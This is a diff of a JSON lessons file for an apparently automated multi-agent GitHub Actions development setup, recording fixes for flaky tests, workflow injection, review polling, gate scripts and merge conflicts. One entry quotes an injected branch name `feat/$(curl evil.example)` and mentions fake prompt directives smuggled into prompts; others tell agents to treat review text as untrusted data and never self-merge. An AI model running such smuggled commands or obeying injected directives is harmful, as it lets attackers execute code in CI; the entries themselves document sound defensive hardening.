@@ -70,7 +70,7 @@
   "timing-race-two-phase-budget": {
     "status": "active",
     "valid_to": null,
-    "l0": "Flaky timing tests with two phases (setup → trigger): poll instead of fixed sleep, and use two named constants…",
+    "l0": "Two-phase timing tests: poll for the setup condition, define KILL_TIMEOUT_MS = STARTUP_BUDGET_MS + slack.",
     "l1": "When a test confirms 'state is ready' before an event fires (e.g. wait for pid file, then kill), a formula like `KILL_TIMEOUT_MS - 1000` hides the dependency: changing either constant silently breaks the other, and the gap collapses on loaded CI runners. process.test.js ('spawnFile timeout kills the whole process tree') flaked on windows-latest/node-20 (Issue #9) because the grandchild hadn't written its pid file within the 1s pre-kill window — the tree was killed before the assertion could pass.",
     "value": "Pattern: (1) poll for the setup condition (pid file, port, lock, etc.) bounded by STARTUP_BUDGET_MS; (2) define KILL_TIMEOUT_MS = STARTUP_BUDGET_MS + N (2s recommended slack) so the ordering constraint is encoded in the constant definition, not implicit math. A generous startup budget (5000ms) covers two cold Node starts on a loaded Windows runner. Apply this shape to any test that must confirm 'state ready' before 'event fires'. Provenance: PR #35 / Issue #9 (2026-06-15).",
     "provenance": {
@@ -81,7 +81,7 @@
   "gh-actions-ref-injection": {
     "status": "active",
     "valid_to": null,
-    "l0": "Never interpolate attacker-controlled GitHub context (e.g. `${{ github.event.pull_request.head.ref }}`) inside `run:`…",
+    "l0": "Never interpolate attacker-controlled GitHub context (head.ref) into run:/prompt — pass it via an env: var instead.",
     "l1": "A collaborator can craft a branch name like `feat/$(curl evil.example)` or embed fake prompt directives. When `${{ head.ref }}` appears directly in a `run:` step or a prompt string it is template-interpolated before the shell sees it, executing the payload. Discovered in the dev-mesh autofix/mergefix workflows before PR #22 hardened them.",
     "value": "Structural fix: (1) add `env: PR_BRANCH: ${{ github.event.pull_request.head.ref }}` to each step that needs the ref; (2) use `$PR_BRANCH` (or `$HEAD_REF`) in `run:` and prompt blocks — never the raw `${{ ... head.ref ... }}`; (3) lint-assert that no bare context interpolation of attacker-controlled refs appears in `run:`/prompt blocks. Only integers (PR number) and `env:`/`if:` expressions remain safe for direct interpolation. Provenance: PR #22 (2026-06-15).",
     "provenance": {
@@ -103,7 +103,7 @@
   "github-recursion-guard-poll": {
     "status": "active",
     "valid_to": null,
-    "l0": "GitHub blocks pull_request_review re-triggers from GITHUB_TOKEN → use a cron poll, not an event, to close the…",
+    "l0": "GitHub blocks pull_request_review re-triggers from GITHUB_TOKEN → use a cron poll, not an event, for review-respond.",
     "l1": "When a workflow posts a review via GITHUB_TOKEN, GitHub's recursion guard prevents that same review from firing the pull_request_review event for another run. An event-driven review-responder would never see its own peers' reviews. The only robust trigger is a scheduled poller (e.g. every 30 min) that queries for PRs in CHANGES_REQUESTED state.",
     "value": "Wire review-respond as a scheduled job (cron), not a pull_request_review event listener. Have the Coder read review threads via `gh pr view --json reviews` as untrusted DATA, fix actionable points with minimal edits, commit [review-fix], push — never self-merge. Cap [review-fix] commits per branch (≤2) to bound runaway loops. Completes the self-sustaining mesh loop: idea → build → review → (CHANGES_REQUESTED) → auto-fix → … → human merge. Provenance: PR #23 (2026-06-15).",
     "provenance": {
@@ -114,7 +114,7 @@
   "honesty-gate-role-scoped": {
     "status": "active",
     "valid_to": null,
-    "l0": "Shared gate scripts serving mixed-permission roles need per-caller opt-in flags: `blocked` is fatal for do-workers…",
+    "l0": "Shared gate scripts for mixed roles need per-caller flags: blocked is fatal for do-workers, advisory for ask-roles.",
     "l1": "PR #25 made `blocked` (≥5 denials) globally advisory — too broad. For do-workers (autofix, mergefix, backlog, curate) granted `Edit,Write,Bash(git:*)`, ≥5 denials almost always signals a real misconfigured tool grant (e.g. `Bash(git)` vs `Bash(git:*)` — the exact bug the gate exists to catch). PR #26 reverted the global default and added `--advisory-blocked`: a flag that downgrades `blocked` to warning+exit-0, passed ONLY from light/ask callers (review, triage, intake, research) where probe-denials are expected noise. The pure classifier in `src/dev-mesh/health.js` is unchanged — it still…",
     "value": "When writing a gate script shared by both do-workers and ask-workers: (1) keep `blocked` → exit 1 as the strict default; (2) add an explicit opt-in flag (`--advisory-blocked`) that downgrades to `::warning::` + exit 0; (3) pass the flag ONLY from ask/light-role callers where denials are expected (review, triage, intake, research); (4) do-workers (autofix, mergefix, backlog, curate) pass nothing and stay strict. Never make advisory the global default — do-workers need the gate red when their tool grants are broken. Provenance: PR #26 (2026-06-15), supersedes honesty-gate-blocked-advisory.",
     "provenance": {
@@ -136,7 +136,7 @@
   "fix-then-lint-pattern": {
     "status": "active",
     "valid_to": null,
-    "l0": "Gate policy runtime fix is step 1 of 2 — always open a lint/test follow-up to statically enforce the new convention…",
+    "l0": "Gate-policy runtime fix is step 1 of 2 — always add a lint/test follow-up to statically enforce the new convention.",
     "l1": "PR #25 changed `blocked` from fatal→advisory in the honesty gate and updated docs/quick.json. But without a static check, a future edit to assert-run-healthy.mjs can silently revert the exit-code semantics. PR #28 was opened as the lint follow-up: verify ask-role agents' blocked exit policy matches their declared tool grants. The runtime fix without the lint step is incomplete.",
     "value": "Two-step pattern: (1) fix runtime gate behavior + document in quick.json; (2) immediately open a follow-up ticket/PR to add a lint rule or test that encodes the new exit-code semantics statically. Apply whenever any gate's status→exit-code mapping changes. Provenance: PR #25 (runtime fix) + PR #27 (lesson promoted) + PR #28 (lint follow-up), 2026-06-15.",
     "provenance": {
@@ -147,7 +147,7 @@
   "actions-pr-open-repo-setting": {
     "status": "active",
     "valid_to": null,
-    "l0": "gh pr create from Actions needs both `pull-requests: write` YAML permission AND the repo-level 'Allow GitHub Actions…",
+    "l0": "gh pr create from Actions needs both pull-requests:write YAML AND the repo 'Allow Actions to create PRs' toggle.",
     "l1": "The YAML `permissions: pull-requests: write` is necessary but not sufficient. The GitHub repository setting (Settings → Actions → General → 'Allow GitHub Actions to create and approve pull requests') must also be ON. Without it, a workflow can push branches but `gh pr create` silently fails — the PR is never opened. The first memory:promote PR (#12) was manually bridged by a human session because this setting was missing at initial dev-mesh deployment.",
     "value": "When deploying a new dev-mesh instance (or any Actions workflow that opens PRs), verify the repo setting before the first run. Symptom of missing setting: branch exists in remote, but no PR appears. Fix: Settings → Actions → General → enable 'Allow GitHub Actions to create and approve pull requests'. The dev-mesh-curate.yml workflow already carries the correct YAML permissions — the repo toggle is the only remaining gate.",
     "provenance": {
@@ -159,7 +159,7 @@
     "status": "active",
     "valid_to": null,
     "core": true,
-    "l0": "Multiple bots writing memory PRs simultaneously → merge conflicts on shared files (e.g. quick.json) — fix once with an…",
+    "l0": "Multiple bots writing memory PRs concurrently conflict on shared files (quick.json) — auto-resolve once via mergefix.",
     "l1": "PR #12 was blocked when two memory PRs both touched quick.json at the same time. The systemic fix (PR #16) is dev-mesh-mergefix.yml: on every main update, detect DIRTY same-repo PRs → merge main → auto-resolve (quick.json: union both sides' keys; code: minimal combined result; unresolvable: abort + comment) → commit [mergefix] → push. Safety: ≤2 [mergefix] commits per branch (branch-only count, excluding merged history), no force-push, no auto-merge, same-repo only. GITHUB_TOKEN pushes don't re-trigger the workflow so there is no loop.",
     "value": "When the dev-mesh gains new agents that write to shared memory files, conflicts are expected and self-heal via mergefix without manual intervention. For quick.json, key-union resolution ensures no lesson is silently dropped. The human merge gate is preserved. Track the [mergefix] commit count per branch (≤2) as the bounded-safety invariant.",
     "provenance": {
